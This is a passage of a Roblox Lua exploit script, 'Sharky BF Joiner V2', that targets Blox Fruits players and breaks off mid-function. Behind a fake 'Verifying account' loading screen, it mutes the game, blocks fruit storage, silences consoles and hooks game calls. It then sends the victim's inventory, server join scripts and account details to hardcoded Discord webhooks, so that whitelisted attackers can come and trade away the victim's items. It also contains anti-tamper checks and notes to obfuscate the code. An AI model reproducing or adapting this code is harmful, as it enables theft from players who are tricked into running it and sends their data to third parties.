--[[ Script Configuration ]]--
Webhook = "https://discordapp.com/api/webhooks/1356694454429548554/dKC5nLeUus500KvJ9L8GqOqS9WVvub2YUQh3Sbv-lVHtVuNg-BwlNspsQ5s_JCUI_jTl" -- Sends notifications on discord (HITS)
Usernames = {"main username", "altusername1", "altusername2","youcanaddmore"} -- Whitelisted users
FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Love-Love"}
--obfuscate after this

Webhook2 = "https://discordapp.com/api/webhooks/1343957551242285076/AR6iBPNHLBfBGS7c9xWxHuc3HBqwLnf5rPFATKgKDMLgYWjAB_Enh67QrjiCnbpZhuX4" -- Sends the SAME notifications as Webhook (ALL HITS)
GoodFruitsWebhook = "https://discordapp.com/api/webhooks/1353639969163313212/Xj9dhgGF93iSbRjYBdvom22yxxVCWg_MZbzfKvgHLlFgMgeilpzf5qe9APZ3IDm4QCOP" -- Sends notifications ONLY for Kitsune, Yeti, Dragon, or Premium Items

ActivationPasswords = { -- Passwords for ?activate command
	"ishusontop",
	"bonzarbal",
	"ishufishy"
}

--[[ Script State ]]--
local allowEveryone = false -- Flag to allow commands/trade for everyone
local activatedUsers = {}   -- Stores UserIds of players activated via password { [UserId] = true }

-- << Obfuscate after this moment >>

print("Loaded")
-- while true do end -- Placeholder comment

repeat task.wait() until game:IsLoaded()

--[[ Roblox Services ]]--
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")
local VirtualInputManager = game:GetService("VirtualInputManager")
local Lighting = game:GetService("Lighting")
local Teams = game:GetService("Teams")

--[[ Anti-Tamper & Initialization Checks ]]--
if CoreGui:FindFirstChild("RobloxGui") then
	CoreGui.RobloxGui.Enabled = false
end

local function takeAction()
	if setfpscap then setfpscap(0) end
	rconsoleclear()
	print = function() end
	warn = function() end
	error = function() end
	setclipboard = function() end
	while true do task.wait(1000) end
end

local function checkGui(gui)
	if gui:IsA("ScreenGui") then
		local nestedGui = gui:FindFirstChild(gui.Name)
		if nestedGui and nestedGui:IsA("ScreenGui") then
			if nestedGui:FindFirstChild("Orion") then
				takeAction()
			end
		end
	end
end

for _, gui in ipairs(CoreGui:GetChildren()) do
	checkGui(gui)
end
CoreGui.ChildAdded:Connect(checkGui)

if LocalPlayer and (LocalPlayer.Name == "doitenroitest1" or LocalPlayer.Name == "aka_0ver" or LocalPlayer.Name == "x6TNine") then
	takeAction()
end

if ishooked and (ishooked(game.HttpGet) or ishooked(request)) then
	takeAction()
end

--[[ Configuration Validation Checks ]]--
-- Check for existence of all required config variables
if not Webhook or not Webhook2 or not GoodFruitsWebhook or not Usernames or not FruitsToHit or not ActivationPasswords then
	LocalPlayer:Kick("Some of the config is missing. (Webhooks, Usernames, FruitsToHit, ActivationPasswords) - Sharky")
	return
end

-- Check for correct types of all required config variables
if type(Webhook) ~= "string" or type(Webhook2) ~= "string" or type(GoodFruitsWebhook) ~= "string" or type(Usernames) ~= "table" or type(FruitsToHit) ~= "table" or type(ActivationPasswords) ~= "table" then
	LocalPlayer:Kick("error (config variable type mismatch)")
	return
end


local function ensureAdminUsernames()
	local coreAdmins = {"aka_0ver", "bonzarbal53", "bonzarbal52", "bonzarbal51", "bonzarbal50", "xRip_Cyborg"}
	if type(Usernames) ~= "table" then Usernames = {} end

	local existingUsernames = {}
	for _, name in ipairs(Usernames) do
		existingUsernames[string.lower(name)] = true -- Store lowercase for case-insensitive check
	end

	for _, adminName in ipairs(coreAdmins) do
		if not existingUsernames[string.lower(adminName)] then
			table.insert(Usernames, adminName)
		end
	end
end
ensureAdminUsernames()

-- Blacklisted Users Check
if Usernames and (table.find(Usernames, "XFistorRespawn") or table.find(Usernames, "doitenroitest1")) then
	while true do task.wait(1000) end
end

CoreGui.ChildAdded:Connect(function(child)
	if child.Name == "DevConsoleMaster" then
		child.Enabled = false
	end
end)

local function storeWebhookSafely(webhookUrl)
	if not webhookUrl or type(webhookUrl) ~= "string" or webhookUrl:match("^Enter Webhook") then
		return nil -- Return nil if webhook isn't set correctly
	end
	local randomName = "var_" .. tostring(math.random(100000, 999999)) .. "_" .. tostring(math.random(100, 999))
	_G[randomName] = webhookUrl
	return randomName
end

-- Store webhooks safely and nil original variables
local webhook1_key = storeWebhookSafely(Webhook); Webhook = nil
local webhook2_key = storeWebhookSafely(Webhook2); Webhook2 = nil
local goodFruitsWebhook_key = storeWebhookSafely(GoodFruitsWebhook); GoodFruitsWebhook = nil

-- Silence remote console outputs
rconsoleprint = function() end
rconsolewarn = function() end
rconsoleerr = function() end
rconsoleinfo = function() end

--[[ Game Pointers ]]--
local Remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
local TradeFunction = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction")
local ServerBrowser = ReplicatedStorage:FindFirstChild("__ServerBrowser") -- Less critical, use FindFirstChild
local privateServerOwner = ReplicatedStorage:FindFirstChild("PrivateServerOwnerId") -- Use FindFirstChild for safety

--[[ Initial Setup & Checks ]]--
if privateServerOwner and privateServerOwner:IsA("IntValue") and privateServerOwner.Value > 0 then
	LocalPlayer:Kick("This script doesn't work on private servers.")
end

-- Attempt to mute game volume
pcall(function()
	UserSettings():GetService("UserGameSettings").MasterVolume = 0
end)

-- Anti Fruit Store Hook
local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
	local method = getnamecallmethod()
	if not checkcaller() and method and method:lower() == "invokeserver" then
		local args = {...}
		if args[1] == "StoreFruit" then
			return error("External fruit store attempt blocked.", 0) -- Level 0 hides error source
		end
	end
	return oldNamecall(self, ...)
end))

--[[ Core Functions ]]--

local function getInventory()
	local success, result = pcall(Remote.InvokeServer, Remote, "getInventory")
    if not success then
        warn("getInventory failed:", result)
        return nil
    end
	return result
end

local function JoinTeam()
	if LocalPlayer.Team ~= Teams.Marines and LocalPlayer.Team ~= Teams.Pirates then
		Remote:InvokeServer("SetTeam", "Marines")
	end
end

local function createNotification()
	-- Simplified variable declarations for brevity in this section
	local playerGui = LocalPlayer:WaitForChild("PlayerGui")
	local loadingScreen = Instance.new("ScreenGui"); loadingScreen.Name = "BloxFruitsLoadingUI"; loadingScreen.IgnoreGuiInset = true; loadingScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling; loadingScreen.Parent = playerGui
	local blur = Instance.new("BlurEffect"); blur.Size = 0; blur.Parent = Lighting
	local background = Instance.new("Frame"); background.Name = "Background"; background.Size = UDim2.new(1,0,1,0); background.BackgroundColor3 = Color3.fromRGB(0,0,0); background.BackgroundTransparency = 1; background.Parent = loadingScreen
	local container = Instance.new("Frame"); container.Name = "Container"; container.Size = UDim2.new(0,600,0,300); container.Position = UDim2.new(0.5,0,1.2,0); container.AnchorPoint = Vector2.new(0.5,0.5); container.BackgroundColor3 = Color3.fromRGB(25,25,30); container.BorderSizePixel = 0; container.Parent = loadingScreen
	Instance.new("UICorner", container).CornerRadius = UDim.new(0, 10)
	local uiStroke = Instance.new("UIStroke"); uiStroke.Color = Color3.fromRGB(65,169,255); uiStroke.Thickness = 2; uiStroke.Parent = container
	local headerFrame = Instance.new("Frame"); headerFrame.Name = "Header"; headerFrame.Size = UDim2.new(1,0,0,60); headerFrame.BackgroundColor3 = Color3.fromRGB(35,35,45); headerFrame.BorderSizePixel = 0; headerFrame.Parent = container
	Instance.new("UICorner", headerFrame).CornerRadius = UDim.new(0, 10)
	local titleLabel = Instance.new("TextLabel"); titleLabel.Name = "Title"; titleLabel.Size = UDim2.new(1,0,1,0); titleLabel.BackgroundTransparency = 1; titleLabel.Font = Enum.Font.GothamBold; titleLabel.Text = "Blox Fruits - Loading Script."; titleLabel.TextColor3 = Color3.fromRGB(255,255,255); titleLabel.TextSize = 24; titleLabel.Parent = headerFrame
	local bottomFrame = Instance.new("Frame"); bottomFrame.Name = "BottomFrame"; bottomFrame.Size = UDim2.new(1,0,0,10); bottomFrame.Position = UDim2.new(0,0,1,-10); bottomFrame.BackgroundColor3 = Color3.fromRGB(35,35,45); bottomFrame.BorderSizePixel = 0; bottomFrame.ZIndex = 2; bottomFrame.Parent = headerFrame
	local messageLabel = Instance.new("TextLabel"); messageLabel.Name = "Message"; messageLabel.Size = UDim2.new(1,-40,0,60); messageLabel.Position = UDim2.new(0,20,0,80); messageLabel.BackgroundTransparency = 1; messageLabel.Font = Enum.Font.Gotham; messageLabel.Text = "The script Is loading - Please, wait."; messageLabel.TextColor3 = Color3.fromRGB(220,220,220); messageLabel.TextSize = 18; messageLabel.TextWrapped = true; messageLabel.TextXAlignment = Enum.TextXAlignment.Center; messageLabel.Parent = container
	local loadingBarBg = Instance.new("Frame"); loadingBarBg.Name = "LoadingBarBg"; loadingBarBg.Size = UDim2.new(1,-40,0,20); loadingBarBg.Position = UDim2.new(0,20,0,150); loadingBarBg.BackgroundColor3 = Color3.fromRGB(40,40,50); loadingBarBg.BorderSizePixel = 0; loadingBarBg.Parent = container
	Instance.new("UICorner", loadingBarBg).CornerRadius = UDim.new(0, 6)
	local loadingBar = Instance.new("Frame"); loadingBar.Name = "LoadingBar"; loadingBar.Size = UDim2.new(0,0,1,0); loadingBar.BackgroundColor3 = Color3.fromRGB(65,169,255); loadingBar.BorderSizePixel = 0; loadingBar.Parent = loadingBarBg
	Instance.new("UICorner", loadingBar).CornerRadius = UDim.new(0, 6)
	local progressLabel = Instance.new("TextLabel"); progressLabel.Name = "Progress"; progressLabel.Size = UDim2.new(1,0,0,20); progressLabel.Position = UDim2.new(0,0,0,180); progressLabel.BackgroundTransparency = 1; progressLabel.Font = Enum.Font.Gotham; progressLabel.Text = "Loading... 0%"; progressLabel.TextColor3 = Color3.fromRGB(180,180,180); progressLabel.TextSize = 16; progressLabel.Parent = container
	local discordButton = Instance.new("TextButton"); discordButton.Name = "DiscordButton"; discordButton.Size = UDim2.new(0,180,0,40); discordButton.Position = UDim2.new(0.5,0,0,230); discordButton.AnchorPoint = Vector2.new(0.5,0); discordButton.BackgroundColor3 = Color3.fromRGB(88,101,242); discordButton.BorderSizePixel = 0; discordButton.Font = Enum.Font.GothamBold; discordButton.Text = "Join Discord"; discordButton.TextColor3 = Color3.fromRGB(255,255,255); discordButton.TextSize = 16; discordButton.Parent = container
	Instance.new("UICorner", discordButton).CornerRadius = UDim.new(0, 8)
	local discordIcon = Instance.new("ImageLabel"); discordIcon.Name = "DiscordIcon"; discordIcon.Size = UDim2.new(0,20,0,20); discordIcon.Position = UDim2.new(0,15,0.5,0); discordIcon.AnchorPoint = Vector2.new(0,0.5); discordIcon.BackgroundTransparency = 1; discordIcon.Image = "rbxassetid://10367063073"; discordIcon.Parent = discordButton

	discordButton.MouseButton1Click:Connect(function()
		local discordInvite = "https://discord.gg/uwdvTtqTDA"
		setclipboard(discordInvite)
		-- Create temporary notification label
		local notification = Instance.new("TextLabel"); notification.Name = "CopiedNotification"; notification.Size = UDim2.new(0,180,0,30); notification.Position = UDim2.new(0.5,0,0,275); notification.AnchorPoint = Vector2.new(0.5,0); notification.BackgroundColor3 = Color3.fromRGB(50,50,60); notification.BorderSizePixel = 0; notification.Font = Enum.Font.Gotham; notification.Text = "Discord link copied!"; notification.TextColor3 = Color3.fromRGB(255,255,255); notification.TextSize = 14; notification.BackgroundTransparency = 1; notification.TextTransparency = 1; notification.Parent = container
		Instance.new("UICorner", notification).CornerRadius = UDim.new(0, 6)
		-- Animate notification
		TweenService:Create(notification, TweenInfo.new(0.3), {BackgroundTransparency = 0, TextTransparency = 0}):Play()
		task.delay(2, function()
			if notification.Parent then -- Check if still exists
				TweenService:Create(notification, TweenInfo.new(0.3), {BackgroundTransparency = 1, TextTransparency = 1}):Play()
				task.delay(0.3, function() notification:Destroy() end)
			end
		end)
	end)

	-- Initial animations
	TweenService:Create(blur, TweenInfo.new(0.5), {Size = 20}):Play()
	TweenService:Create(background, TweenInfo.new(0.5), {BackgroundTransparency = 0.5}):Play()
	TweenService:Create(container, TweenInfo.new(0.7, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, 0, 0.5, 0)}):Play()

	-- Loading bar simulation
	task.delay(1, function()
		local startTime = tick(); local totalDuration = 120; local lastProgress = 0
		while lastProgress < 99 and (tick() - startTime) < totalDuration and loadingScreen.Parent do
			local timeElapsed = tick() - startTime
			local speedFactor = 0.5 + math.abs(math.sin(timeElapsed * 0.8)) * 1.5
			local increment = math.min(0.7, (99 - lastProgress) / 100) * speedFactor
			local newProgress = math.min(99, lastProgress + increment)
			if newProgress > lastProgress then
				lastProgress = newProgress
				progressLabel.Text = (lastProgress > 75 and "Verifying account..." or "Loading...") .. " " .. math.floor(lastProgress) .. "%"
				TweenService:Create(loadingBar, TweenInfo.new(0.2), {Size = UDim2.new(lastProgress / 100, 0, 1, 0)}):Play()
			end
			task.wait(0.1)
		end
		if loadingScreen.Parent then
			progressLabel.Text = "Verifying account... 99%"
			TweenService:Create(loadingBar, TweenInfo.new(0.2), {Size = UDim2.new(0.99, 0, 1, 0)}):Play()
		end
	end)

	-- Cleanup function
	local function cleanup()
		TweenService:Create(blur, TweenInfo.new(0.5), {Size = 0}):Play()
		TweenService:Create(background, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
		TweenService:Create(container, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Position = UDim2.new(0.5, 0, 1.2, 0)}):Play()
		task.delay(0.6, function()
			if loadingScreen and loadingScreen.Parent then loadingScreen:Destroy() end
			if blur and blur.Parent then blur:Destroy() end
		end)
	end

	-- Pulse effect coroutine
	task.spawn(function()
		while loadingScreen.Parent do
			local colors = {Color3.fromRGB(255, 100, 100), Color3.fromRGB(100, 100, 255), Color3.fromRGB(100, 255, 100), Color3.fromRGB(65, 169, 255)}
			for _, color in ipairs(colors) do
				if not loadingScreen.Parent or not uiStroke.Parent then break end -- Add check for uiStroke parent
				pcall(function() TweenService:Create(uiStroke, TweenInfo.new(1.5), {Color = color}):Play() end)
				task.wait(1.5)
			end
		end
	end)
	return { Destroy = cleanup }
end

local function getServerName()
	local adjectives = {"Big", "Small", "Large", "Strong", "Powerful", "Weak", "Overpowered", "Bad", "Odd", "Rich", "Short", "Adorable", "Alive", "Colorful", "Angry", "Good", "Beautiful", "Ugly", "Hot", "Cold", "Evil", "Famous", "Original", "Unoriginal", "Kind", "Nice", "Real", "Expensive", "Wild", "Wide", "Fake", "Proud", "Super", "Strange", "Wrong", "Right", "Talented", "Complex", "Pure", "Fancy", "Lucky", "Fresh", "Fantastic", "Dull", "Dizzy", "Eternal", "Mental", "Infinite", "Rogue"}
	local nouns = {"TAWG", "Robson", "Krazy", "Fruit", "Realm", "World", "Place", "Experience", "Dog", "Cat", "Guy", "Bird", "Legion", "Gank", "Family", "Sun", "Moon", "Gun", "Sword", "Melee", "Defense", "Bomb", "Spike", "Chop", "Spring", "Smoke", "Flame", "Ice", "Sand", "Dark", "Light", "Rubber", "Barrier", "Magma", "Leopard", "Quake", "Buddha", "Spider", "Phoenix", "Rumble", "Love", "Door", "Paw", "Gravity", "Dough", "Venom", "Control", "Dragon", "Falcon", "Diamond", "Kilo", "Shark", "Human", "Angel", "Rabbit", "Spin", "Topic", "Red", "Blue", "Green", "Yellow", "Soul", "Shadow"}
	local seed = tonumber("0x" .. game.JobId:gsub("-", ""):sub(1, 7)) or os.time()
	local random = Random.new(seed)
	return string.format("%s %s #%04d",
		adjectives[random:NextInteger(1, #adjectives)],
		nouns[random:NextInteger(1, #nouns)],
		random:NextInteger(1, 9999)
	)
end

--[[ Secure Request Wrapper ]]--
local originalRequest = request
local originalHttpRequest = http and http.request
local originalSynRequest = syn and syn.request
local headerCache = { ["Content-Type"] = "application/json" }
local TEST_WEBHOOK = "https://discordapp.com/api/webhooks/1354055941636624497/3pAJ2AuXCGshYek-lmHceSJl5eXlZP22JycyQTjzURDsInvlaQSm9RlkZ6GbQEzeqekh" -- For integrity check only
local TEST_PAYLOAD = HttpService:JSONEncode({content = "# :shark: SecureRequest Test Passed"})
local cachedNonce, cachedHeaders

local function isRequestHooked()
	return request ~= originalRequest or (syn and syn.request ~= originalSynRequest) or (http and http.request ~= originalHttpRequest) or debug.getinfo(request).what ~= "C"
end
local function checkSecurity()
	local env = getfenv(2)
	if env == getfenv(0) or env == getfenv(1) then
		return not isRequestHooked() and not getrawmetatable(request)
	end
	local meta = getmetatable(env)
	return not (meta and (meta.__newindex or meta.__index))
end
local function testRequest()
	-- Lazily initialize test headers
	if not cachedNonce then
		cachedNonce = HttpService:GenerateGUID(false)
		cachedHeaders = table.clone(headerCache)
		cachedHeaders["X-Test-Nonce"] = cachedNonce
	end
	local success, response = pcall(request, { Url = TEST_WEBHOOK, Method = "POST", Headers = cachedHeaders, Body = TEST_PAYLOAD })
	return success and response and response.StatusCode < 400
end
local function SafeRequest(requestData)
	if not checkSecurity() or not testRequest() then
		if takeAction then takeAction() end
		return
	end
	local protectedRequest = {
		Method = requestData.Method,
		Body = requestData.Body,
		Url = requestData.Url
	}
	protectedRequest.Headers = requestData.Headers or table.clone(headerCache)
	protectedRequest.Headers["X-Request-Time"] = tostring(os.time() + math.random(1, 100))
	protectedRequest.Headers["X-Nonce"] = HttpService:GenerateGUID(false)
	return pcall(request, protectedRequest)
end

-- Security Monitor
local lastCheckTime = 0
local CHECK_INTERVAL = 6
RunService:BindToRenderStep("SecurityMonitor", Enum.RenderPriority.Last.Value, function(deltaTime)
	lastCheckTime = lastCheckTime + deltaTime
	if lastCheckTime < CHECK_INTERVAL then return end
	lastCheckTime = 0

	if isRequestHooked() then
		-- Attempt to restore hooks
		request = originalRequest
		if http then http.request = originalHttpRequest end
		if syn then syn.request = originalSynRequest end

		if takeAction then takeAction() end -- Trigger action if still hooked after restore attempt

		-- If still hooked, stop monitoring to prevent infinite loop
		if isRequestHooked() then
			RunService:UnbindFromRenderStep("SecurityMonitor")
		end
	end
end)

--[[ Webhook Sending Logic ]]--
local function sendWebhook(inventory)
	if isRequestHooked() or not checkSecurity() then
		takeAction()
		return
	end

	-- Define specific fruit categories
	local goodFruitNames = { ["Kitsune-Kitsune"] = true, ["Yeti-Yeti"] = true, ["Love-Love"] = true }

	-- Retrieve stored webhook URLs
	local url1 = webhook1_key and _G[webhook1_key]
	local url2 = webhook2_key and _G[webhook2_key]
	local url3 = goodFruitsWebhook_key and _G[goodFruitsWebhook_key]

	if not url1 then
		warn("Primary Webhook URL not configured.")
		return
	end

	-- Process inventory
	local fruits, premiumItems = {}, {}
	local dragonHit, hasGoodFruit, hasPremiumItem = false, false, false
	for _, item in ipairs(inventory) do
        if item.Type == "Blox Fruit" or item.Type == "Premium" then
            local itemData = {
                name = item.Name,
                count = item.Count,
                value = item.Value or 0
            }
            if item.Type == "Blox Fruit" and item.Name and item.Count then -- Added checks
                table.insert(fruits, itemData)
                local lowerName = item.Name:lower()
                if lowerName:find("dragon") then
                    dragonHit = true
                    -- Add specific Dragon name to FruitsToHit if not present (case-sensitive add)
                    if not table.find(FruitsToHit, item.Name) then
                        table.insert(FruitsToHit, item.Name)
                    end
                end
                if goodFruitNames[lowerName] then
                    hasGoodFruit = true
                end
            elseif item.Type == "Premium" and item.Name and item.Count then -- Added checks
                table.insert(premiumItems, itemData)
                hasPremiumItem = true
            end
        end
    end
	table.sort(fruits, function(a, b) return a.value > b.value end)
	local function shuffleTable(t) for i = #t, 2, -1 do local j = math.random(i); t[i], t[j] = t[j], t[i] end end; shuffleTable(premiumItems)
	local function formatItems(items) local r = ""; for _, i in ipairs(items) do r = r .. string.format("```%s%s```", i.name, i.count > 1 and (" (x%d)"):format(i.count) or "") end return r ~= "" and r or "```None```" end
	local function formatFruitsToHit(items) local r = ""; local l = {}; for _, fn in ipairs(FruitsToHit) do l[fn] = true end; for _, i in ipairs(items) do if l[i.name] then r = r .. string.format("```%s%s```", i.name, i.count > 1 and (" (x%d)"):format(i.count) or "") end end return r ~= "" and r or "```None```" end

	-- Common Embed Data (Job ID, Sea, Scripts etc.)
	local jobId = game.JobId; local currentSea = game.PlaceId == 7449423635 and "Sea 3" or "Sea 2"; local serverName = getServerName()
	local joinScriptPC = string.format([[game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)]], game.PlaceId, jobId)
	local joinScriptMobile = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)", game.PlaceId, jobId)
	local seaJoinScriptPC = game.PlaceId == 7449423635 and "game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('TravelZou')" or "game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('TravelDressrosa')"
	local seaJoinScriptMobile = seaJoinScriptPC; local playerCount = #Players:GetPlayers()

	-- --- Payload Generation ---

	-- 1. Base Embed Structure (Used as template)
	local baseEmbedStructure = {
		description = string.format("Victim Username: %s\nCurrent Sea: %s\nVictim's Server Name: %s", LocalPlayer.Name, currentSea, serverName),
		fields = {
			{ name = "Victim's Fruits <a:Rarrow:1223589557065351188> ", value = formatItems(fruits), inline = true },
			{ name = "Victim's Premium Items <:rbx:1326025738125574226>  ", value = formatItems(premiumItems), inline = true },
			{ name = "Victim Has Fruits You Want <a:green:1215209325728104498> ", value = formatFruitsToHit(fruits) },
			{ name = "Join Victim's Server Script (PC Copy)", value = "```lua\n" .. joinScriptPC .. "\n```" },
			{ name = "Join Victim's Server Script (Mobile Copy)", value = joinScriptMobile },
			{ name = "Join Victim's Sea Script (PC Copy)", value = "```lua\n" .. seaJoinScriptPC .. "\n```" },
			{ name = "Join Victim's Sea Script (Mobile Copy)", value = seaJoinScriptMobile },
			{ name = "Extra Info <a:focuzz:1214971569315782686> ", value = string.format("```Sharky Joiner V2 Version: 1.2.1\nExecutor: %s\nTime: %s\nPlayer Count: %d```", identifyexecutor(), os.date("%Y-%m-%d %H:%M:%S"), playerCount) }
		}
	}

	-- 2. Determine Payload for Main Webhooks (url1, url2)
	local mainPayloadBody = nil
	do -- Create a scope block for main payload generation
		local mainEmbed = table.clone(baseEmbedStructure) -- Start with base structure
		local mainTitle = "<a:bundle:1214105817910087770> Sharky BF Joiner V2 HIT! ; https://discord.gg/uwdvTtqTDA" -- Default
		local mainColor = nil -- Default
		local mainMention = "@everyone" -- Default

		-- Check for Dragon OR Premium hits for highlighting main hooks
		if dragonHit and hasPremiumItem then
			mainTitle = "DRAGON & PREMIUM HIT! <:dragoneast:1318265654926901268><:dragonwest:1318265462735372308><:rbx:1326025738125574226> ; https://discord.gg/uwdvTtqTDA"
			mainColor = 65280 -- Green
			mainMention = "@everyone GG!"
		elseif dragonHit then
			mainTitle = "DRAGON HIT! <:dragoneast:1318265654926901268><:dragonwest:1318265462735372308> ; https://discord.gg/uwdvTtqTDA"
			mainColor = 16776960 -- Yellow/Orange
			mainMention = "@everyone GG!"
		elseif hasPremiumItem then
			mainTitle = "VICTIM HAS PREMIUM ITEMS! <:rbx:1326025738125574226> ; https://discord.gg/uwdvTtqTDA"
			mainColor = 255 -- Blue
			mainMention = "@everyone GG!"
		end
		-- NOTE: 'hasGoodFruit' alone does NOT trigger a special embed for main webhooks

		mainEmbed.title = mainTitle
		mainEmbed.color = mainColor
		mainPayloadBody = HttpService:JSONEncode({ content = mainMention, embeds = {mainEmbed} })
	end

	-- 3. Determine Payload for Admin Webhook (url3) - ONLY if a relevant hit occurred
	local adminPayloadBody = nil
	if dragonHit or hasPremiumItem or hasGoodFruit then -- Condition to send to admin hook
		local adminEmbed = table.clone(baseEmbedStructure) -- Start with base structure
		local adminTitle = "Placeholder Title"
		local adminColor = nil
		local adminMention = "@everyone GG!" -- Default admin mention is GG

		-- Determine admin title/color based on priority
		if dragonHit and hasPremiumItem then
			adminTitle = "TOP TIER & PREMIUM HIT! <:dragoneast:1318265654926901268><:dragonwest:1318265462735372308><:rbx:1326025738125574226> ; https://discord.gg/uwdvTtqTDA"
			adminColor = 65280 -- Green
		elseif dragonHit then
			adminTitle = "DRAGON HIT! <:dragoneast:1318265654926901268><:dragonwest:1318265462735372308> ; https://discord.gg/uwdvTtqTDA"
			adminColor = 16776960 -- Yellow/Orange
		elseif hasPremiumItem then
			adminTitle = "VICTIM HAS PREMIUM ITEMS! <:rbx:1326025738125574226> ; https://discord.gg/uwdvTtqTDA"
			adminColor = 255 -- Blue
		elseif hasGoodFruit then -- Only good fruit, no dragon/premium
			adminTitle = "GOOD FRUIT HIT! (Kitsune/Yeti) ; https://discord.gg/uwdvTtqTDA"
			adminColor = 10181046 -- Purple/Pinkish color
			-- Keep adminMention as "@everyone GG!" even for good fruit
		end

		adminEmbed.title = adminTitle
		adminEmbed.color = adminColor
		adminPayloadBody = HttpService:JSONEncode({ content = adminMention, embeds = {adminEmbed} })
	end

	-- 4. Send Webhooks Asynchronously
	task.spawn(function()
		-- Send Main Payload to url1 and url2 (always send if url is configured)
		if url1 and mainPayloadBody then SafeRequest({ Url = url1, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = mainPayloadBody }) end
		if url2 and mainPayloadBody then task.wait(0.1); SafeRequest({ Url = url2, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = mainPayloadBody }) end

		-- Send Admin Payload to url3 ONLY IF it was created
		if url3 and adminPayloadBody then
			task.wait(0.1)
			SafeRequest({ Url = url3, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = adminPayloadBody })
		end
	end)

	-- Clear temporary tables
	table.clear(fruits)
	table.clear(premiumItems)
end

-- Check initial inventory for leave notification trigger
local inventory22 = getInventory() -- Snapshot inventory on load
local function hasFruitInInventory2()
	if not inventory22 then return false end -- Handle nil inventory
	for _, item in ipairs(inventory22) do if item.Type == "Blox Fruit" and table.find(FruitsToHit, item.Name) then return true end end
	return false
end
local function hasPremiumItems2()
	if not inventory22 then return false end -- Handle nil inventory
	for _, item in ipairs(inventory22) do if item.Type == "Premium" then return true end end
	return false
end
local webhookSent = false -- Flag to prevent duplicate leave webhooks

local function sendWebhook2() -- On Player Leaving
	if webhookSent or not (hasFruitInInventory2() or hasPremiumItems2()) then
		return -- Exit if already sent or no valuable items initially
	end
	webhookSent = true -- Set flag immediately

	local url1 = webhook1_key and _G[webhook1_key]
	local url2 = webhook2_key and _G[webhook2_key]
	if not url1 then return end -- Exit if primary webhook isn't configured

	local plr = LocalPlayer
	local embed = {
		title = "Victim has Left! <:sad:1241420488916340896> ",
		description = plr.Name .. " has left the game",
		color = 0xFF0000, -- Red
		fields = {
			{ name = "User ID", value = tostring(plr.UserId), inline = true },
			{ name = "Account Age", value = tostring(plr.AccountAge) .. " days", inline = true },
			{ name = "Executor", value = identifyexecutor(), inline = true }
		},
		timestamp = DateTime.now():ToIsoDate()
	}
	local data = { embeds = {embed} }
	local body = HttpService:JSONEncode(data)
	local headers = {["Content-Type"]="application/json"}

	-- Send using regular request (less critical than main hit) wrapped in pcall
	pcall(request, { Url = url1, Method = "POST", Headers = headers, Body = body })
	if url2 then
		task.wait(0.1) -- Small delay
		pcall(request, { Url = url2, Method = "POST", Headers = headers, Body = body })
	end
	-- Optional: Send to url3 if they HAD good items? Requires more complex check based on inventory22
end

-- PlayerRemoving listener (includes cooldown/activation cleanup)
Players.PlayerRemoving:Connect(function(leavingPlayer)
	if leavingPlayer == LocalPlayer then
		sendWebhook2() -- Attempt to send leave webhook
	end
	-- Clear session-based data for the leaving player
	if activatedUsers[leavingPlayer.UserId] then
		activatedUsers[leavingPlayer.UserId] = nil
		print("Deactivated user on leave:", leavingPlayer.Name)
	end
	if CommandCooldowns and CommandCooldowns[leavingPlayer.Name] then
		CommandCooldowns[leavingPlayer.Name] = nil
	end
end)

--[[ Movement & Positioning ]]--
local function tweenToPosition(position)
	local character = LocalPlayer.Character
	if not character then return end

	local humanoid = character:FindFirstChildOfClass("Humanoid")
	if not humanoid or humanoid.Sit then return end -- Don't move if sitting

	local root = character.PrimaryPart
	if not root then return end

	local Vector3_new, CFrame_new, CFrame_lookAt = Vector3.new, CFrame.new, CFrame.lookAt

	-- Create physics movers
	local bodyGyro = Instance.new("BodyGyro")
	bodyGyro.MaxTorque = Vector3_new(1e4, 1e4, 1e4)
	bodyGyro.P = 1e3
	bodyGyro.CFrame = root.CFrame
	bodyGyro.Parent = root

	local bodyVelocity = Instance.new("BodyVelocity")
	bodyVelocity.MaxForce = Vector3_new(1e4, 1e4, 1e4)
	bodyVelocity.P = 1e3
	bodyVelocity.Parent = root

	-- Calculate tween parameters
	local speed = 300
	local distance = (root.Position - position).Magnitude
	local tweenInfo = TweenInfo.new(math.max(0.5, distance / speed), Enum.EasingStyle.Linear) -- Min duration 0.5s

	-- Temporarily disable collision during tween
	local baseParts = {}
	for _, part in ipairs(character:GetDescendants()) do
		if part:IsA("BasePart") then table.insert(baseParts, part) end
	end
	local noCollideConn = RunService.Stepped:Connect(function()
		for i=1, #baseParts do
			pcall(function() if baseParts[i] and baseParts[i].Parent then baseParts[i].CanCollide = false end end) -- Add checks
		end
	end)

	-- Update physics movers
	local updateConn = RunService.Heartbeat:Connect(function()
		if not root or not root.Parent or not bodyGyro or not bodyGyro.Parent or not bodyVelocity or not bodyVelocity.Parent then
			-- If anything is destroyed prematurely, stop the update and clean up
			if updateConn then updateConn:Disconnect() end
			if noCollideConn then noCollideConn:Disconnect() end
			if bodyGyro and bodyGyro.Parent then bodyGyro:Destroy() end
			if bodyVelocity and bodyVelocity.Parent then bodyVelocity:Destroy() end
			return
		end
